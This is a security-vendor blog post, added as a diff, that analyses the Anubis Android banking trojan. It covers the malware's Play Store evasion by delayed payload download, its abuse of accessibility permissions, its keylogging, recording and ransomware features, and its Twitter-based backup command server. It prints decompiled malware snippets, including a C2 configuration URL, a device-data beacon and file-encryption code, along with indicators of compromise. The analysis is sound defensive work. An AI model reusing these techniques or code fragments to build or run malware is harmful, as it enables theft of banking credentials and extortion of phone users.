@@ -1,0 +1,177 @@
+Anubis is Back: Are You Prepared?
+
+This fully-featured bot is, once again, managing to bypass Google Play Store security measures. We look at just how dangerous the Anubis mobile malware can be.
+
+Written by
+Jagadeesh Chandraiah
+
+August 14, 2018
+
+SophosLabs Uncut Android Banker Anubis Banking malware Sophos Mobile
+
+By Jagadeesh Chandraiah
+Known to Android researchers as credential-stealing malware that (predominantly) targets Turkish users, a malware family called Anubis has successfully infiltrated the Google Play Store in the past few months.
+The app creators often disguise their Trojan as a financial, automotive or a shopping application, but in reality, it functions as a downloader. Once activated, the Anubis app fetches the main malicious payload, which is designed to steal banking credentials and provide remote control functionality of the compromised device to the botnet owners.
+Google swept clean the Play Store after Anubis was first discovered. But we didn’t get much of a break; New Anubis downloaders were recently spotted on the Play Store.
+The persistence of this banking malware family merits us taking a closer look at its functionality.
+So what is Anubis exactly?
+No, this post is not about the ancient Egyptian god of embalming and the dead. Anubis is a banking trojan and bot derived from the Maza-in banking Trojan source code leak we wrote about earlier this year.
+All the applications that appeared on Google Play Store appeared as innocuous applications, as they do not have any payload embedded in them.
+
+These apps are downloaders: they fetch the payload after successful installation and interaction with command and control server.
+With millions of applications on the Play Store that download some kind of content from the Internet, it’s difficult for Google Play’s security service to scan and fully understand what kind of content is being downloaded.
+Thus, malicious downloaders may appear to be clean when they arrive into the Store. Upon successful installation and activation, these apps wait for some time, and only after a long wait do they download and activate their malicious content. This simple but extremely vicious trick allows malware authors to fool the Play Store defense mechanisms. We’ve seen malware authors use this delaying tactic before and, based on the success we see, will likely continue to do so in the future — at least until Google introduces some kind of countermeasures.
+Downloader
+The code of the downloader is the first layer of the malicious application. It uses no obfuscation and, at first sight, looks clean in order to bypass Google Play’s defenses to be allowed to be published.
+Once installed, the downloader will collect device data, send a beacon signal to the C2 server, and also download more applications.
+In the following code, you can see the references to the CnC server and the configuration data of the malware.
+public static final boolean REPEAT_ADMIN_REQUEST_AFTER_DISABLE = true;
+public static List SERVERS = null;
+public static int SERVER_TRY_COUNT = 0;
+public static final long START_INSTALL_INTERVAL = 20000;
+public static final long TASKS_CHECK_INTERVAL = 60000;
+
+static {
+Config.LOGS_DIR = "";
+Config.DOWNLOADS_DIR = new File(Environment.getExternalStorageDirectory(), Rows.downloads);
+Config.SERVERS = Arrays.asList(new String[]{"http://bluetek1com/gate.php"});
+Config.SERVER_TRY_COUNT = 5;
+}
+
+The data collected by the malware includes such parameters as IMEI, OS version, model name, root status:
+((Map)v3).put(Rows.api_req, "1");
+((Map)v3).put(Rows.api_imei, Utils.getImei(arg6));
+((Map)v3).put(Rows.api_uniqnum, arg7.getId());
+((Map)v3).put(Rows.api_model, Build.MODEL);
+String v4 = Rows.api_root;
+String v1 = Utils.isRootAvailable() ? "1" : "2";
+((Map)v3).put(v4, v1);
+((Map)v3).put(Rows.api_country, ((TelephonyManager)v0_1).getNetworkCountryIso());
+((Map)v3).put(Rows.api_osver, Build$VERSION.RELEASE);
+v2.postAdd(Utils.getPostBody(((Map)v3)));
+
+Critical strings are concealed via obfuscation. Here is an example of an obfuscated string:
+"D**pE2****pE2****pE2**i**pE2****pE2****pE2**s**pE2****pE2**a[REMOVED]"
+Same string in its de-obfuscated form:
+"Disabling this option can BREAK your system. Are you sure?"
+Payload
+As previously mentioned, the dropped payload is the Anubis banking trojan itself.
+Once executed, the malicious payload pops up an Accessibility permission request access, pretending to be a Google Protect request.
+Accessibility permission provides malware with additional ability to simulate clicks for buttons displayed on the screen, get callbacks for certain events and construct the context of the device to steal users data.
+
+Unlike the downloader, the Trojan’s source code is obfuscated to make it difficult to analyse.
+On execution, it hides its shortcut icon. Then, the payload drops and loads another JAR file during the runtime. Next, it waits in the background for further actions.
+Extra Features
+In addition to the banking malware, Anubis also has additional functionality. It’s pretty bad:
+
+SMS spam sending
+RAT (Remote Administration Tool) features:
+
+sound recording
+capturing screen contents
+location tracking
+keylogging
+
+Ransomware
+
+Here’s a snippet of code from the sound recorder function:
+MediaRecorder v6 = new MediaRecorder();
+this.c.a("SOUND", "START RECORD SOUND");
+this.b = false;
+v6.setAudioSource(1);
+v6.setOutputFormat(3);
+v6.setAudioEncoder(1);
+v6.setOutputFile(arg11);
+Thread v7 = new Thread(new Runnable(arg12, v6, arg11, arg10) {
+public void run() {
+StringBuilder v3;
+String v2;
+c v1_2;
+try {
+Thread.sleep(((long)(this.a * 1000)));
+}
+catch(Throwable v1) {
+this.e.c.a("SOUND", "STOP RECORD SOUND");
+
+The built-in ransomware component encrypts user files and gives them .Anubiscrypt file extension. Remember, this runs on a phone, which is even less likely to be backed up than a laptop or desktop, and more likely to have personal photos or other valuable data:
+else if(!v2.getPath().contains(".AnubisCrypt")) {
+v3 = this.a.a(v3, this.c);
+StringBuilder v6 = new StringBuilder();
+v6.append(v2.getPath());
+v6.append(".AnubisCrypt");
+v4 = new FileOutputStream(v6.toString(), true);
+v4.write(v3);
+
+if(this.b.equals("crypt")) {
+v7_1 = this.a;
+v1_1 = new StringBuilder();
+v1_1.append("p=");
+v2_1 = this.a;
+v3 = new StringBuilder();
+v3.append(this.a.q(((Context)this)));
+v3.append("|The Cryptor is activated, the file system is encrypted by key: ");
+v3.append(this.c);
+v3.append("|");
+v1_1.append(v2_1.c(v3.toString()));
+v7_1.b(((Context)this), "4", v1_1.toString());
+v7_1 = this.a;
+v0_1 = "cryptfile";
+v1_2 = "true";
+
+The brief workflow of the Anubis malware is shown below:
+
+C2 Communication
+When the downloader app sends a beacon to C2 server, the data contains the phone’s root status, IMEI, device model, and other parameters.
+NOTE: at the time of writing, the C2 was silent.
+{
+"root":"1",
+"country":"gb",
+"os ver":"5.0",
+"uniqnum":"15b76e7d-e1a1-4f3a-8603-5f4b8041bd64",
+“imei":"123442323",
+"req" :"1",
+"model":"Nexus 5"
+}:
+
+Usage of Twitter to fetch Backup C2
+It’s quite interesting that this trojan backs up a trend of relying on Twitter to fetch backup C2. Similar behavior was seen in the Red alert Banking Trojan.
+The example below demonstrates how one of the twitter handles contains base64-encoded data, enclosed with the zero tag:
+
+The decoded data is URL of the backup C2 server:
+http://erhgefhsdfsdg<dot>com
+
+The C2 provides malware with a fake login screen for online banking, such as the one below:
+
+C2 panel and Directory Structure
+Anubis malware communicates with several different C2 servers. Some of them expose the open directory structure. By glancing into of the servers open directories, we have discovered over 700 malicious Android applications, prepared to be served back to the victims:
+
+The admin panel of the C2 panel discloses detailed information about the victims of this malware.
+In only one such server, the information was aggregated from over 2,600 active victims, each one of them reporting back to the server. The data collected on the server is the same that the malware collects from the victims – it includes root status, IMEI, country, and connection status:
+
+Targeted Banking Applications
+Anubis trojan targets more than 70 different banking applications, built for online banking with such banks as Santander, Natwest, RBS, and Citibank.
+On top of that, the malware also targets some non-banking applications, such as PayPal, eBay, and Amazon.
+Conclusion
+Given the demonstrated persistence, Anubis is an ongoing campaign that won’t go away any time soon.
+Several Anubis applications have been removed from Play store, demonstrating a double-edge sword. On one hand, Google Play is fighting hard, locating and removing malicious applications from the Play Store.
+On the other hand, these applications keep coming back, each time using various tricks to fool Google Play’s defenses, to be published again and again.
+A simple trick when the malicious payload is downloaded after a certain delay is surprisingly resilient.
+The reduce a chance of being infected, the users should install apps from the reputable developers only.
+From our side, we keep tracking this particular campaign, among many others, leaving the users of the Sophos Mobile Security no chance of being infected.
+Sophos detects Anubis downloaders as Andr/Banker-GWQ and the payload itself as Andr/Banker-GUZ and Andr/Banker-GTN.
+IOC: C2 domains
+bluetek1<dot>com
+junilogart8<dot>info
+redtek0<dot>com
+
+IOC: Malware Hashes
+074ae028bd3204a7e7e7a510ad0f88c49cb780fa07e91944f111af146c39c91c
+5a6f9ac189dc65dad3744005644a251f73ff2a8022a70431bf90945fc7da021b
+
+Share on Facebook
+
+Share on Twitter
+
+Share on LinkedIn
+
+1
